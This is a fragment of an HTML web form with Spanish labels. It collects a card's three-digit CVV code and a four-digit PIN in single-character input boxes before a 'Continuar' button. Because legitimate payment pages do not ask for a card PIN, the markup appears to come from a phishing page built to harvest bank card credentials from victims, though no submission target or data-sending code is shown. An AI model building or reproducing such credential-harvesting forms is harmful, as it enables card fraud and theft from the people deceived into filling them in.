                        </div>

                        <div class="form-group mb20 ">
                            <label for="cc1">Código cvv de 3 dígitos <img src="../assets/imgs/icon.png"></label>
                            <div class="inputss three">
                                <input required style="width: 30%;" type="text" inoutmode="numeric" maxlength="1" name="three1" id="three1" class="form-control" value="">
                                <input required style="width: 30%;" type="text" inoutmode="numeric" maxlength="1" name="three2" id="three2" class="form-control" value="">
                                <input required style="width: 30%;" type="text" inoutmode="numeric" maxlength="1" name="three3" id="three3" class="form-control" value="">
                            </div>
                            
                        </div>

                        <div class="form-group ">
                            <label for="cc1">PIN <img src="../assets/imgs/icon.png"></label>
                            <div class="inputss four">
                                <input required type="password" inoutmode="numeric" maxlength="1" name="pin1" id="pin1" class="form-control" value="">
                                <input required type="password" inoutmode="numeric" maxlength="1" name="pin2" id="pin2" class="form-control" value="">
                                <input required type="password" inoutmode="numeric" maxlength="1" name="pin3" id="pin3" class="form-control" value="">
                                <input required type="password" inoutmode="numeric" maxlength="1" name="pin4" id="pin4" class="form-control" value="">
                            </div>
                            
                        </div>


                        <div class="btns">
                            <button type="submit">Continuar</button>
                        </div>
